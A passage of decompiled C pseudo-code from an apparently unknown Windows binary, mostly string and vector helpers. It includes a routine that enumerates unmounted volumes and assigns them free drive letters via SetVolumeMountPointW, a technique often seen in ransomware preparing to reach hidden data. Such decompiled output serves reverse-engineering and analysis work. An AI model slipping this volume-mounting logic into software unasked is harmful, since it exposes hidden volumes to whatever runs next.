        v8 = 2147483646;
      }
    }
    else
    {
      v8 = 2147483646;
    }
    v10 = sub_404910(v8 + 1);
    v15 = v10;
    Src[4] = v16;
    Size = 2 * a3;
    Src[5] = v8;
    v11 = 2 * v19;
    v17 = (char *)v10 + 2 * v19;
    v12 = v19;
    v20 = (_WORD *)v10 + v19 + a3;
    if ( v4 < 8 )
    {
      memmove(v10, Src, v11);
      memmove(v17, a2, Size);
      *v20 = 0;
      *Src = v15;
      return Src;
    }
    else
    {
      v13 = (_DWORD *)*Src;
      memmove(v10, (const void *)*Src, 2 * v12);
      memmove(v17, a2, Size);
      *v20 = 0;
      if ( 2 * v4 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v13 - *(v13 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v13 = (_DWORD *)*(v13 - 1);
      }
      sub_44775B(v13);
      *Src = v15;
      return Src;
    }
  }
  else
  {
    v6 = Src;
    v14 = (void *)(a3 + v5);
    Src[4] = a3 + v5;
    if ( v4 >= 8 )
      v6 = (_DWORD *)*Src;
    memmove_0((char *)v6 + 2 * v5, a2, 2 * a3);
    *((_WORD *)v6 + (_DWORD)v14) = 0;
    return Src;
  }
}
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (00404630) --------------------------------------------------------
void __noreturn sub_404630()
{
  sub_42E5A8((int)"invalid string position");
}
// 404630: using guessed type void __noreturn sub_404630();

//----- (00404640) --------------------------------------------------------
char *__thiscall sub_404640(int *this, int a2, int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // edi
  unsigned int v9; // eax
  void *v10; // eax
  _DWORD *v11; // esi
  char *v12; // ebx
  int v13; // edx
  int v14; // ecx
  int v16; // [esp-8h] [ebp-20h]
  int v17; // [esp+Ch] [ebp-Ch]
  int v18; // [esp+10h] [ebp-8h]

  v4 = *this;
  v18 = (a2 - *this) / 24;
  v5 = (this[1] - *this) / 24;
  v17 = v5;
  if ( v5 == 178956970 )
    sub_404860();
  v6 = (this[2] - v4) / 24;
  v7 = (unsigned int)((this[2] - v4) / 24) >> 1;
  if ( v6 <= 178956970 - v7 )
  {
    v8 = v7 + v6;
    if ( v7 + v6 < v5 + 1 )
      v8 = v5 + 1;
  }
  else
  {
    v8 = v5 + 1;
  }
  if ( v8 > 0xAAAAAAA )
    goto LABEL_17;
  v9 = 24 * v8;
  if ( 24 * v8 < 0x1000 )
  {
    if ( v9 )
      v11 = operator new(24 * v8);
    else
      v11 = 0;
    goto LABEL_14;
  }
  if ( v9 + 35 <= v9 )
LABEL_17:
    sub_403CC0();
  v10 = operator new(v9 + 35);
  if ( !v10 )
    _invalid_parameter_noinfo_noreturn();
  v11 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
  *(v11 - 1) = v10;
LABEL_14:
  v12 = (char *)&v11[6 * v18];
  *((_DWORD *)v12 + 4) = 0;
  *((_DWORD *)v12 + 5) = 0;
  *(_OWORD *)v12 = *(_OWORD *)a3;
  *((_QWORD *)v12 + 2) = *(_QWORD *)(a3 + 16);
  *(_DWORD *)(a3 + 16) = 0;
  *(_DWORD *)(a3 + 20) = 7;
  *(_WORD *)a3 = 0;
  v13 = this[1];
  v14 = *this;
  v16 = (int)v11;
  if ( a2 != v13 )
  {
    sub_4049B0(v14, a2, (int)v11);
    v14 = a2;
    v13 = this[1];
    v16 = (int)(v12 + 24);
  }
  sub_4049B0(v14, v13, v16);
  sub_404870(this, (int)v11, v17 + 1, v8);
  return (char *)&v11[6 * v18];
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404860: using guessed type void __noreturn sub_404860(void);

//----- (004047B0) --------------------------------------------------------
void __fastcall sub_4047B0(int a1, int a2)
{
  int i; // esi
  unsigned int v4; // ecx
  _DWORD *v5; // eax

  for ( i = a1; i != a2; i += 24 )
  {
    v4 = *(_DWORD *)(i + 20);
    if ( v4 >= 8 )
    {
      v5 = *(_DWORD **)i;
      if ( 2 * v4 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v5 = (_DWORD *)*(v5 - 1);
      }
      sub_44775B(v5);
    }
    *(_DWORD *)(i + 16) = 0;
    *(_DWORD *)(i + 20) = 7;
    *(_WORD *)i = 0;
  }
}

//----- (00404820) --------------------------------------------------------
void __cdecl sub_404820(void *a1, unsigned int a2)
{
  void *v2; // eax

  v2 = a1;
  if ( a2 >= 0x1000 )
  {
    if ( (unsigned int)a1 - *((_DWORD *)a1 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*((_DWORD *)a1 - 1);
  }
  sub_44775B(v2);
}

//----- (00404860) --------------------------------------------------------
void __noreturn sub_404860()
{
  sub_42E588((int)"vector too long");
}
// 404860: using guessed type void __noreturn sub_404860();

//----- (00404870) --------------------------------------------------------
int __thiscall sub_404870(int *this, int a2, int a3, int a4)
{
  int v5; // ecx
  _DWORD *v6; // esi
  int result; // eax

  v5 = *this;
  if ( v5 )
  {
    sub_4047B0(v5, this[1]);
    v6 = (_DWORD *)*this;
    if ( (unsigned int)(24 * ((this[2] - *this) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v6 - *(v6 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v6 = (_DWORD *)*(v6 - 1);
    }
    sub_44775B(v6);
  }
  *this = a2;
  this[1] = a2 + 24 * a3;
  result = a2 + 24 * a4;
  this[2] = result;
  return result;
}

//----- (00404900) --------------------------------------------------------
void __noreturn sub_404900()
{
  sub_42E588((int)"string too long");
}
// 404900: using guessed type void __noreturn sub_404900();

//----- (00404910) --------------------------------------------------------
_DWORD *__stdcall sub_404910(unsigned int a1)
{
  size_t v1; // eax
  void *v2; // eax
  void *v3; // ecx
  _DWORD *result; // eax

  if ( a1 > 0x7FFFFFFF )
    goto LABEL_9;
  v1 = 2 * a1;
  if ( 2 * a1 < 0x1000 )
  {
    if ( v1 )
      return operator new(v1);
    else
      return 0;
  }
  if ( v1 + 35 <= v1 )
LABEL_9:
    sub_403CC0();
  v2 = operator new(v1 + 35);
  v3 = v2;
  if ( !v2 )
    _invalid_parameter_noinfo_noreturn();
  result = (_DWORD *)(((unsigned int)v2 + 35) & 0xFFFFFFE0);
  *(result - 1) = v3;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);

//----- (00404970) --------------------------------------------------------
unsigned int __cdecl sub_404970(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // esi

  v3 = a1 | 7;
  if ( (a1 | 7u) > a3 )
    return a3;
  v4 = a2 >> 1;
  if ( a2 > a3 - (a2 >> 1) )
    return a3;
  if ( v3 < v4 + a2 )
    return v4 + a2;
  return v3;
}

//----- (004049B0) --------------------------------------------------------
int __fastcall sub_4049B0(int a1, int a2, int a3)
{
  int v3; // esi
  int v4; // eax

  v3 = a3;
  if ( a1 != a2 )
  {
    v4 = a3 - a1;
    do
    {
      *(_DWORD *)(v3 + 16) = 0;
      *(_DWORD *)(v4 + a1 + 20) = 0;
      *(_OWORD *)v3 = *(_OWORD *)a1;
      *(_QWORD *)(v3 + 16) = *(_QWORD *)(a1 + 16);
      v3 += 24;
      *(_DWORD *)(a1 + 16) = 0;
      *(_DWORD *)(a1 + 20) = 7;
      *(_WORD *)a1 = 0;
      a1 += 24;
    }
    while ( a1 != a2 );
  }
  sub_4047B0(v3, v3);
  return v3;
}

//----- (00404A10) --------------------------------------------------------
_DWORD *__cdecl sub_404A10(size_t a1)
{
  void *v1; // eax
  void *v2; // ecx
  _DWORD *result; // eax

  if ( a1 < 0x1000 )
  {
    if ( a1 )
      return operator new(a1);
    else
      return 0;
  }
  else
  {
    if ( a1 + 35 <= a1 )
      sub_403CC0();
    v1 = operator new(a1 + 35);
    v2 = v1;
    if ( !v1 )
      _invalid_parameter_noinfo_noreturn();
    result = (_DWORD *)(((unsigned int)v1 + 35) & 0xFFFFFFE0);
    *(result - 1) = v2;
  }
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);

//----- (00404A70) --------------------------------------------------------
_DWORD *__thiscall sub_404A70(_DWORD *this)
{
  _DWORD *v2; // eax
  unsigned int v3; // esi
  int v4; // ecx
  int v5; // edx
  _DWORD *v6; // eax
  _WORD *v7; // eax
  _WORD *v8; // ecx
  _WORD *i; // esi
  int v11; // [esp+8h] [ebp-4h] BYREF

  v2 = this;
  v3 = this[5];
  if ( v3 >= 8 )
    v2 = (_DWORD *)*this;
  v4 = 2 * this[4];
  v5 = (int)v2 + v4;
  v6 = this;
  if ( v3 >= 8 )
    v6 = (_DWORD *)*this;
  v7 = (_WORD *)((char *)v6 + v4);
  v8 = this;
  if ( v3 >= 8 )
    v8 = (_WORD *)*this;
  if ( v8 != v7 )
  {
    do
    {
      if ( !*v8 )
        break;
      ++v8;
    }
    while ( v8 != v7 );
    if ( v8 != v7 )
    {
      for ( i = v8 + 1; i != v7; ++i )
      {
        if ( *i )
          *v8++ = *i;
      }
    }
  }
  return sub_404010(this, &v11, (int)v8, v5);
}

//----- (00404AF0) --------------------------------------------------------
char sub_404AF0()
{
  unsigned int i; // esi
  _QWORD *v1; // eax
  __int128 v2; // xmm0
  unsigned int v3; // eax
  void *v4; // ecx
  char *v5; // edi
  _DWORD *v6; // esi
  _DWORD *v7; // ecx
  _DWORD *v8; // edi
  unsigned int v9; // ecx
  _DWORD *v10; // eax
  const WCHAR *v11; // ecx
  const WCHAR *v12; // eax
  WCHAR *v13; // ecx
  char *v14; // eax
  unsigned int v16; // [esp+Ch] [ebp-5Ch]
  __int16 v17; // [esp+10h] [ebp-58h] BYREF
  DWORD LogicalDrives; // [esp+14h] [ebp-54h]
  char v19; // [esp+1Bh] [ebp-4Dh]
  __int64 v20; // [esp+1Ch] [ebp-4Ch]
  unsigned int v21; // [esp+24h] [ebp-44h]
  _BYTE Block[24]; // [esp+28h] [ebp-40h] BYREF
  LPCWSTR lpszVolumeMountPoint[3]; // [esp+40h] [ebp-28h] BYREF
  void *v24[2]; // [esp+4Ch] [ebp-1Ch] BYREF
  unsigned int v25; // [esp+54h] [ebp-14h]
  int v26; // [esp+64h] [ebp-4h]

  v19 = 0;
  v20 = 0i64;
  v21 = 0;
  v24[0] = 0;
  v24[1] = 0;
  v25 = 0;
  v26 = 0;
  LogicalDrives = GetLogicalDrives();
  for ( i = 0; i < 0x1A; ++i )
  {
    sub_4053B0((int)Block, i + 65);
    LOBYTE(v26) = 1;
    if ( !*(_DWORD *)&Block[16] && ((1 << i) & LogicalDrives) == 0 )
    {
      v17 = i + 65;
      sub_404330(Block, &v17, 1u);
      sub_4044A0(Block, L":\\", 2u);
      v1 = v24[1];
      if ( v24[1] != (void *)v25 )
      {
        v2 = *(_OWORD *)Block;
        *((_DWORD *)v24[1] + 4) = 0;
        *(_WORD *)Block = 0;
        *(_OWORD *)v1 = v2;
        v1[2] = *(_QWORD *)&Block[16];
        v3 = 7;
        v24[1] = (char *)v24[1] + 24;
        goto LABEL_8;
      }
      sub_404640((int *)v24, (int)v24[1], (int)Block);
    }
    v3 = *(_DWORD *)&Block[20];
LABEL_8:
    LOBYTE(v26) = 0;
    if ( v3 >= 8 )
    {
      v4 = *(void **)Block;
      if ( 2 * v3 + 2 >= 0x1000 )
      {
        v4 = *(void **)(*(_DWORD *)Block - 4);
        if ( (unsigned int)(*(_DWORD *)Block - (_DWORD)v4 - 4) > 0x1F )
          goto LABEL_41;
      }
      sub_44775B(v4);
    }
  }
  v5 = (char *)v24[0];
  v6 = v24[1];
  LogicalDrives = (DWORD)v24[0];
  v20 = *(_QWORD *)v24;
  v16 = v25;
  v21 = v25;
  v24[0] = 0;
  v24[1] = 0;
  v25 = 0;
  v26 = 2;
  memset(&Block[12], 0, 12);
  sub_404E00((DWORD)&Block[12]);
  LOBYTE(v26) = 3;
  v7 = *(_DWORD **)&Block[16];
  if ( *(_DWORD *)&Block[12] != *(_DWORD *)&Block[16] )
  {
    v8 = (_DWORD *)(*(_DWORD *)&Block[12] + 44);
    do
    {
      if ( !v8[5] && (_DWORD *)LogicalDrives != v6 )
      {
        v6 -= 6;
        sub_4055B0(lpszVolumeMountPoint, v6);
        v9 = v6[5];
        if ( v9 >= 8 )
        {
          v10 = (_DWORD *)*v6;
          if ( 2 * v9 + 2 >= 0x1000 )
          {
            if ( (unsigned int)v10 - *(v10 - 1) - 4 > 0x1F )
              goto LABEL_41;
            v10 = (_DWORD *)*(v10 - 1);
          }
          sub_44775B(v10);
        }
        v6[4] = 0;
        v6[5] = 7;
        *(_WORD *)v6 = 0;
        HIDWORD(v20) = v6;
        if ( *(v8 - 1) && v24[1] )
        {
          v11 = (const WCHAR *)(v8 - 5);
          if ( *v8 >= 8u )
            v11 = *(const WCHAR **)v11;
          v12 = (const WCHAR *)lpszVolumeMountPoint;
          if ( v25 >= 8 )
            v12 = lpszVolumeMountPoint[0];
          SetVolumeMountPointW(v12, v11);
        }
        v19 = 1;
        if ( v25 >= 8 )
        {
          v13 = (WCHAR *)lpszVolumeMountPoint[0];
          if ( 2 * v25 + 2 >= 0x1000 )
          {
            v13 = (WCHAR *)*((_DWORD *)lpszVolumeMountPoint[0] - 1);
            if ( (unsigned int)((char *)lpszVolumeMountPoint[0] - (char *)v13 - 4) > 0x1F )
              goto LABEL_41;
          }
          sub_44775B(v13);
        }
        v7 = *(_DWORD **)&Block[16];
      }
      v8 += 18;
    }
    while ( v8 - 11 != v7 );
    v5 = (char *)LogicalDrives;
  }
  sub_405460(&Block[12]);
  if ( v5 )
  {
    sub_4047B0((int)v5, (int)v6);
    v14 = v5;
    if ( (unsigned int)(24 * ((int)(v16 - (_DWORD)v5) / 24)) >= 0x1000 )
    {
      v5 = (char *)*((_DWORD *)v5 - 1);
      if ( (unsigned int)(v14 - v5 - 4) > 0x1F )
LABEL_41:
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v5);
  }
  return v19;
}
// 49DC78: using guessed type wchar_t asc_49DC78[3];

//----- (00404E00) --------------------------------------------------------
_DWORD *__stdcall sub_404E00(DWORD a1)
{
  _DWORD *v1; // esi
  HANDLE FirstVolumeW; // edi
  unsigned int v3; // kr00_4
  unsigned int v4; // esi
  DWORD DosDeviceW; // eax
  WCHAR *v6; // eax
  LPWCH *v7; // eax
  LPWCH *v8; // eax
  void *v9; // ecx
  __int128 v10; // xmm1
  int v11; // eax
  __int64 v12; // xmm2_8
  __int128 v13; // xmm0
  int v14; // eax
  DWORD cchBufferLength; // [esp+10h] [ebp-490h] BYREF
  __int128 v17; // [esp+14h] [ebp-48Ch] BYREF
  __int64 v18; // [esp+24h] [ebp-47Ch]
  __int128 v19; // [esp+2Ch] [ebp-474h] BYREF
  __int64 v20; // [esp+3Ch] [ebp-464h]
  void *Block[4]; // [esp+44h] [ebp-45Ch]
  __int64 v22; // [esp+54h] [ebp-44Ch]
  LPWCH lpszVolumePathNames[4]; // [esp+5Ch] [ebp-444h] BYREF
  __int64 v24; // [esp+6Ch] [ebp-434h]
  __int64 v25; // [esp+74h] [ebp-42Ch] BYREF
  int v26; // [esp+7Ch] [ebp-424h]
  WCHAR TargetPath[260]; // [esp+80h] [ebp-420h] BYREF
  WCHAR szVolumeName[260]; // [esp+288h] [ebp-218h] BYREF
  int v29; // [esp+49Ch] [ebp-4h]

  v1 = (_DWORD *)a1;
  cchBufferLength = a1;
  v25 = 0i64;
  v26 = 0;
  v29 = 0;
  memset(szVolumeName, 0, sizeof(szVolumeName));
  FirstVolumeW = FindFirstVolumeW(szVolumeName, 0x104u);
  if ( FirstVolumeW != (HANDLE)-1 )
  {
    do
    {
      v3 = wcslen(szVolumeName);
      if ( szVolumeName[0] != 92 )
        break;
      if ( szVolumeName[1] != 92 )
        break;
      if ( szVolumeName[2] != 63 )
        break;
      if ( szVolumeName[3] != 92 )
        break;
      v4 = 2 * v3 - 2;
      if ( *(WCHAR *)((char *)szVolumeName + v4) != 92 )
        break;
      if ( v4 >= 0x208 )
        __report_rangecheckfailure();
      *(WCHAR *)((char *)szVolumeName + v4) = 0;
      memset(TargetPath, 0, sizeof(TargetPath));
      DosDeviceW = QueryDosDeviceW(&szVolumeName[4], TargetPath, 0x104u);
      *(WCHAR *)((char *)szVolumeName + v4) = 92;
      if ( DosDeviceW )
      {
        v18 = 0x700000000i64;
        LOWORD(v17) = 0;
        v20 = 0x700000000i64;
        LOWORD(v19) = 0;
        v22 = 0x700000000i64;
        LOWORD(Block[0]) = 0;
        LOBYTE(v29) = 1;
        sub_404330(&v17, TargetPath, wcslen(TargetPath));
        sub_404330(&v19, szVolumeName, wcslen(szVolumeName));
        cchBufferLength = 260;
        sub_404120(lpszVolumePathNames, 0x104u, 0);
        LOBYTE(v29) = 2;
        v6 = (WCHAR *)lpszVolumePathNames;
        if ( HIDWORD(v24) >= 8 )
          v6 = lpszVolumePathNames[0];
        if ( GetVolumePathNamesForVolumeNameW(szVolumeName, v6, cchBufferLength, &cchBufferLength) )
        {
          if ( cchBufferLength > (unsigned int)v24 )
          {
            sub_405640(lpszVolumePathNames, cchBufferLength - v24, 0);
            sub_404A70(lpszVolumePathNames);
          }
          else
          {
            v7 = lpszVolumePathNames;
            LODWORD(v24) = cchBufferLength;
            if ( HIDWORD(v24) >= 8 )
              v7 = (LPWCH *)lpszVolumePathNames[0];
            *((_WORD *)v7 + cchBufferLength) = 0;
            sub_404A70(lpszVolumePathNames);
          }
        }
        else
        {
          v8 = lpszVolumePathNames;
          LODWORD(v24) = 0;
          if ( HIDWORD(v24) >= 8 )
            v8 = (LPWCH *)lpszVolumePathNames[0];
          *(_WORD *)v8 = 0;
        }
        LOBYTE(v29) = 1;
        if ( HIDWORD(v22) >= 8 )
        {
          v9 = Block[0];
          if ( (unsigned int)(2 * HIDWORD(v22) + 2) >= 0x1000 )
          {
            v9 = (void *)*((_DWORD *)Block[0] - 1);
            if ( (unsigned int)(Block[0] - v9 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          sub_44775B(v9);
        }
        v10 = *(_OWORD *)lpszVolumePathNames;
        v11 = HIDWORD(v25);
        v12 = v24;
        *(_OWORD *)Block = *(_OWORD *)lpszVolumePathNames;
        v22 = v24;
        if ( HIDWORD(v25) == v26 )
        {
          sub_4058F0((int *)&v25, SHIDWORD(v25), (int)&v17);
        }
        else
        {
          v13 = v17;
          *(_DWORD *)(HIDWORD(v25) + 16) = 0;
          LOWORD(v17) = 0;
          *(_OWORD *)v11 = v13;
          LODWORD(v22) = 0;
          *(_QWORD *)(v11 + 16) = v18;
          v18 = 0x700000000i64;
          *(_OWORD *)(v11 + 24) = v19;
          LOWORD(v19) = 0;
          *(_QWORD *)(v11 + 40) = v20;
          *(_OWORD *)(v11 + 48) = v10;
          LODWORD(v20) = 0;
          *(_QWORD *)(v11 + 64) = v12;
          HIDWORD(v25) += 72;
          HIDWORD(v20) = 7;
          HIDWORD(v22) = 7;
          LOWORD(Block[0]) = 0;
        }
        LOBYTE(v29) = 0;
        sub_4052C0(&v17);
      }
    }
    while ( FindNextVolumeW(FirstVolumeW, szVolumeName, 0x104u) );
    FindVolumeClose(FirstVolumeW);
    v1 = (_DWORD *)a1;
  }
  v14 = v25;
  v1[1] = HIDWORD(v25);
  v1[2] = v26;
  *v1 = v14;
  v25 = 0i64;
  v26 = 0;
  sub_405460(&v25);
  return v1;
}
// 4478AD: using guessed type void __noreturn __report_rangecheckfailure(void);

//----- (004052C0) --------------------------------------------------------
int __thiscall sub_4052C0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  void *v7; // eax
  int result; // eax

  v2 = this[17];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[12];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_17;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[16] = 0;
  this[17] = 7;
  *((_WORD *)this + 24) = 0;
  v4 = this[11];
  if ( v4 >= 8 )
  {
    v5 = (_DWORD *)this[6];
    if ( 2 * v4 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        goto LABEL_17;
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_44775B(v5);
  }
  this[10] = 0;
  this[11] = 7;
  *((_WORD *)this + 12) = 0;
  v6 = this[5];
  if ( v6 >= 8 )
  {
    v7 = (void *)*this;
    if ( 2 * v6 + 2 < 0x1000 )
    {
LABEL_15:
      sub_44775B(v7);
      goto LABEL_16;
    }
    if ( (unsigned int)v7 - *((_DWORD *)v7 - 1) - 4 <= 0x1F )
    {
      v7 = (void *)*((_DWORD *)v7 - 1);
      goto LABEL_15;
    }
LABEL_17:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_16:
  result = 0;
  this[4] = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (004053B0) --------------------------------------------------------
int __stdcall sub_4053B0(int a1, WCHAR a2)
{
  WCHAR *v2; // eax
  __int128 v3; // xmm0
  int result; // eax
  DWORD nLength; // [esp+Ch] [ebp-34h] BYREF
  LPWSTR lpRemoteName[4]; // [esp+10h] [ebp-30h] BYREF
  __int64 v7; // [esp+20h] [ebp-20h]
  WCHAR LocalName; // [esp+34h] [ebp-Ch] BYREF
  int v9; // [esp+36h] [ebp-Ah]

  v9 = 58;
  LocalName = a2;
  nLength = 260;
  sub_404120(lpRemoteName, 0x104u, 0);
  v2 = (WCHAR *)lpRemoteName;
  if ( HIDWORD(v7) >= 8 )
    v2 = lpRemoteName[0];
  WNetGetConnectionW(&LocalName, v2, &nLength);
  sub_404A70(lpRemoteName);
  v3 = *(_OWORD *)lpRemoteName;
  result = a1;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v3;
  *(_QWORD *)(a1 + 16) = v7;
  return result;
}

//----- (00405460) --------------------------------------------------------
void __thiscall sub_405460(_DWORD *this)
{
  _DWORD *v2; // esi
  _DWORD *v3; // ebx

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    v3 = (_DWORD *)this[1];
    if ( v2 != v3 )
    {
      do
      {
        sub_4052C0(v2);
        v2 += 18;
      }
      while ( v2 != v3 );
      v2 = (_DWORD *)*this;
    }
    if ( (unsigned int)(72 * ((this[2] - (int)v2) / 72)) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_44775B(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (004054E0) --------------------------------------------------------
_DWORD *__thiscall sub_4054E0(_DWORD *this, _DWORD *a2, unsigned __int16 a3)
{
  _DWORD *result; // eax
  _DWORD *v4; // edx
  unsigned int v5; // esi

  result = a2;
  v4 = this + 4;
  v5 = this[4];
  if ( (unsigned int)a2 > v5 )
    return sub_405640(this, (unsigned int)a2 - v5, a3);
  if ( this[5] >= 8u )
    this = (_DWORD *)*this;
  *v4 = a2;
  *((_WORD *)this + (_DWORD)a2) = 0;
  return result;
}

//----- (00405520) --------------------------------------------------------
_DWORD *__thiscall sub_405520(_DWORD *this, _QWORD *a2)
{
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  if ( this != (_DWORD *)a2 )
  {
    v3 = this[5];
    if ( v3 >= 8 )
    {
      v4 = (_DWORD *)*this;
      if ( 2 * v3 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v4 = (_DWORD *)*(v4 - 1);
      }
      sub_44775B(v4);
    }
    this[4] = 0;
    this[5] = 7;
    *(_WORD *)this = 0;
    *(_OWORD *)this = *(_OWORD *)a2;
    *((_QWORD *)this + 2) = a2[2];
    *((_DWORD *)a2 + 4) = 0;
    *((_DWORD *)a2 + 5) = 7;
    *(_WORD *)a2 = 0;
  }
  return this;
}

//----- (004055B0) --------------------------------------------------------
_DWORD *__thiscall sub_4055B0(_DWORD *this, _DWORD *Src)
{
  _DWORD *v3; // edi
  bool v4; // cf
  unsigned int v5; // eax
  _DWORD *result; // eax
  int v7; // ebx
  _DWORD *v8; // eax
  unsigned int Srca; // [esp+14h] [ebp+8h]

  v3 = Src;
  this[4] = 0;
  this[5] = 0;
  v4 = Src[5] < 8u;
  v5 = Src[4];
  Srca = v5;
  if ( !v4 )
    v3 = (_DWORD *)*v3;
  if ( v5 >= 8 )
  {
    v7 = v5 | 7;
    if ( (v5 | 7) > 0x7FFFFFFE )
      v7 = 2147483646;
    v8 = sub_404910(v7 + 1);
    *this = v8;
    memmove(v8, v3, 2 * Srca + 2);
    this[4] = Srca;
    result = this;
    this[5] = v7;
  }
  else
  {
    *(_OWORD *)this = *(_OWORD *)v3;
    this[4] = v5;
    result = this;
    this[5] = 7;
  }
  return result;
}

//----- (00405640) --------------------------------------------------------
_DWORD *__thiscall sub_405640(_DWORD *Src, unsigned int a2, unsigned __int16 a3)
{
  unsigned int v4; // edx
  int v5; // ecx
  _DWORD *v6; // eax
  char *v7; // edi
  char *v8; // edi
  int k; // ecx
  _DWORD *result; // eax
  unsigned int v11; // edi
  unsigned int v12; // ecx
  _DWORD *v13; // eax
  char *v14; // edi
  _DWORD *v15; // edi
  char *v16; // edi
  int j; // ecx
  char *v18; // edi
  int i; // ecx
  size_t v20; // [esp-4h] [ebp-24h]
  _DWORD *v21; // [esp+Ch] [ebp-14h]
  unsigned int v22; // [esp+10h] [ebp-10h]
  int v23; // [esp+14h] [ebp-Ch]
  char *v24; // [esp+14h] [ebp-Ch]
  int v25; // [esp+18h] [ebp-8h]
  _DWORD *v26; // [esp+18h] [ebp-8h]
  _DWORD *v27; // [esp+1Ch] [ebp-4h]
  int v28; // [esp+1Ch] [ebp-4h]

  v4 = Src[5];
  v5 = Src[4];
  v23 = v5;
  v22 = v4;
  if ( a2 > v4 - v5 )
  {
    if ( 2147483646 - v5 < a2 )
      sub_404900();
    v28 = v5 + a2;
    v11 = (v5 + a2) | 7;
    if ( v11 <= 0x7FFFFFFE )
    {
      v12 = v4 >> 1;
      if ( v4 <= 2147483646 - (v4 >> 1) )
      {
        if ( v11 < v12 + v4 )
          v11 = v12 + v4;
      }
      else
      {
        v11 = 2147483646;
      }
    }
    else
    {
      v11 = 2147483646;
    }
    v13 = sub_404910(__CFADD__(v11, 1) ? -1 : v11 + 1);
    Src[4] = v28;
    Src[5] = v11;
    v26 = v13;
    v20 = 2 * v23;
    v14 = (char *)v13 + 2 * v23;
    v24 = v14;
    if ( v22 < 8 )
    {
      memmove(v13, Src, v20);
      if ( a2 )
      {
        memset32(v14, (a3 << 16) | a3, a2 >> 1);
        v18 = &v14[4 * (a2 >> 1)];
        for ( i = a2 & 1; i; --i )
        {
          *(_WORD *)v18 = a3;
          v18 += 2;
        }
      }
      *((_WORD *)v26 + v28) = 0;
      result = Src;
      *Src = v26;
    }
    else
    {
      v21 = (_DWORD *)*Src;
      v15 = (_DWORD *)*Src;
      memmove(v13, (const void *)*Src, v20);
      if ( a2 )
      {
        memset32(v24, (a3 << 16) | a3, a2 >> 1);
        v16 = &v24[4 * (a2 >> 1)];
        for ( j = a2 & 1; j; --j )
        {
          *(_WORD *)v16 = a3;
          v16 += 2;
        }
        v15 = v21;
      }
      *((_WORD *)v26 + v28) = 0;
      if ( 2 * v22 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v15 - *(v15 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v15 = (_DWORD *)*(v15 - 1);
      }
      sub_44775B(v15);
      *Src = v26;
      return Src;
    }
  }
  else
  {
    v27 = Src;
    v25 = a2 + v5;
    Src[4] = a2 + v5;
    v6 = Src;
    if ( v4 >= 8 )
    {
      v6 = (_DWORD *)*Src;
      v27 = (_DWORD *)*Src;
    }
    v7 = (char *)v6 + 2 * v5;
    if ( a2 )
    {
      memset32(v7, (a3 << 16) | a3, a2 >> 1);
      v8 = &v7[4 * (a2 >> 1)];
      for ( k = a2 & 1; k; --k )
      {
        *(_WORD *)v8 = a3;
        v8 += 2;
      }
      v6 = v27;
    }
    *((_WORD *)v6 + v25) = 0;
    return Src;
  }
  return result;
}
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (004057F0) --------------------------------------------------------
unsigned int __thiscall sub_4057F0(_DWORD *this, _DWORD *Src)
{
  _DWORD *v2; // edi
  bool v4; // cf
  unsigned int result; // eax
  int v6; // esi
  _DWORD *v7; // eax
  unsigned int Srca; // [esp+10h] [ebp+8h]

  v2 = Src;
  v4 = Src[5] < 8u;
  result = Src[4];
  Srca = result;
  if ( !v4 )
    v2 = (_DWORD *)*v2;
  if ( result >= 8 )
  {
    v6 = result | 7;
    if ( (result | 7) > 0x7FFFFFFE )
      v6 = 2147483646;
    v7 = sub_404910(v6 + 1);
    *this = v7;
    memmove(v7, v2, 2 * Srca + 2);
    result = Srca;
    this[4] = Srca;
    this[5] = v6;
  }
  else
  {
    *(_OWORD *)this = *(_OWORD *)v2;
    this[4] = result;
    this[5] = 7;
  }
  return result;
}

//----- (00405870) --------------------------------------------------------
int __thiscall sub_405870(_DWORD *this, int a2, int a3)
{
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  int result; // eax

  v4 = this[5];
  if ( v4 >= 8 )
  {
    v5 = (_DWORD *)*this;
